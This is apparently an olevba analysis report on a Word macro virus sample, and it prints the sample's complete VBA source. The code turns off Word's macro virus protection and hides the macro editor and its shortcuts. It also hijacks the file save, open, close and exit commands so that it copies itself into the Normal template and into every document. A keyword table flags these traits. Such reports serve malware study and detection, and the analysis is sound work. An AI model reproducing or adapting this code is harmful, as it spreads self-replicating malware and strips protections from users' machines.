olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-8a77afc7b0023df198c9447798f157d60dd5fb05
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-8a77afc7b0023df198c9447798f157d60dd5fb05 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Superjc.bas 
in file: Virus.MSWord.CyberHack-based-8a77afc7b0023df198c9447798f157d60dd5fb05 - OLE stream: 'Macros/VBA/Superjc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By JC'S Hacker
' Esto es lo bello que se aprende también a parte de lo mecánico de la Universidad
' JTBH anywhere that you are, you should remember me, uniquely I wish them that all the world Knew that I him Love, and that nothing will do forget her
' and live those that wonderful thet is the love, but never you will find to nothing like as me
' I was your married, of that you never will forget.
' Con muchisimo Orgullo THE-EPN-SNF-XX-CB desde algún rincon del planeta para, todo el mundo
' Felicidades or Happyness Datafellows, I hope that you can kill this bug early before infect so much machines Good Luck

Public Inicial
Public Salva
Public Infecta
Public Infdocum
Sub JCstart()
    Inicial = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Inhab
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub JCfinal()
Application.DisplayAlerts = Inicial
End Sub
Sub VerinfNorm()
    Call Inhab
    On Error GoTo Step1
    Infecta = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Step2
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infecta = True
      If (NMacr <> "Superjc") And (NMacr <> "SPJC") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Step2:
    If Infecta = False Then
      On Error GoTo Step3
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "Superjc", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "SPJC", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Step3:
    End If
Step1:
End Sub
Sub InfectNor()
    On Error GoTo Step4
    Salva = 0
    Infdocum = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Step5
    For i = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infdocum = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infdocum = True
      On Error GoTo Step5
      If (NMacr <> "Superjc") And (NMacr <> "SPJC") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Referencia a Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Step5:
    If Infdocum = False Then
      On Error GoTo Step6
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "Superjc", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "SPJC", Object:=wdOrganizerObjectProjectItems
      Salva = 1
Step6:
    End If
Step4:
End Sub
Sub Inhab()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Regener()
    On Error GoTo Step7
Set ad = ActiveDocument
    If Salva = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Step7:
End Sub
Sub AutoOpen()
    
    
End Sub
Sub fileclose()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    WordBasic.fileclose
End Sub
Sub File()
Open()
    Call Superjc
    Dialogs(wdDialogFileOpen).Show
    Call JCstart
    Call InfectNor
    Call Regener
    Call JCfinal
End Sub
Sub FileSaveAs()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    On Error GoTo Step11
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Step11:
End Sub
Sub HelpAbout()
    On Error GoTo Step8
    SPJC.Show
Step8:
End Sub
Sub FileExit()
Dim Mes, Dia
Mes = Month(Date)
Dia = Day(Date)
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    On Error GoTo Step9
    If Mes = 9 And Dia = 23 Then SPJC.Show
Step9:
    Call JCfinal
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Superjc
End Sub
Sub FileNew()
    Call Superjc
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Superjc
End Sub
Sub ToolsCustomize()
    Call Superjc
End Sub
Sub ToolsCustomizeKeyboard()
    Call Superjc
End Sub
Sub ViewVBCode()
    Call Superjc
End Sub
Sub Organizer()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

